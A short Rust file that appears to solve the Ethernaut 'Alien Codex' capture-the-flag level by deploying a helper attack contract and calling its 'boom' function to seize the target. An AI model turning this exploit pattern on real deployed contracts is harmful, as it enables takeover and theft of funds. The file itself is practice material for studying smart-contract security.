use crate::abi::human_is_stronger::HumanIsStronger;
use async_trait::async_trait;
use ctf::ethernaut::lvl19_alien_codex::*;
use ethers::{prelude::*, providers::Middleware, utils::keccak256};

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let contract = AlienCodex::new(target.address, offender.clone());
        let hack_contract =
            HumanIsStronger::deploy(offender.to_owned(), target.address)?
                .send()
                .await?;
        hack_contract.boom(offender.address()).send().await?;
        Ok(())
    }
}
